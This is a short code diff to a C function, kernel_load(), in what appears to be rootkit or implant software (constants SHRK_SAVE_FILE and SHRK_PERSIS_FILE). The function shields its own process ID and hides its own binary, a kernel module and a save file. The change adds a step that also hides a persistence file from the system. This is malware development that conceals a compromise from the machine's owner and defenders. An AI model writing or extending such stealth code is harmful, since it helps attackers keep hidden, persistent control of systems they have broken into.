@@ -44,7 +44,7 @@ bool kernel_load() {
     protect_pid(getpid());
  
   else { 
-    // hide the self, the kernel module and the save file
+    // hide the self, the kernel module, save file and the persistence file
     char self[PATH_MAX+1];
 
     if(NULL == get_self(self)) {
@@ -64,6 +64,11 @@ bool kernel_load() {
     
     if(!hide_path(SHRK_SAVE_FILE)){
       debug("failed to hide the save file");
+      goto end;
+    }
+
+    if(SHRK_PERSIS_FILE[0] != 0 && !hide_path(SHRK_PERSIS_FILE)){
+      debug("failed to hide the persistence file");
       goto end;
     }
   }
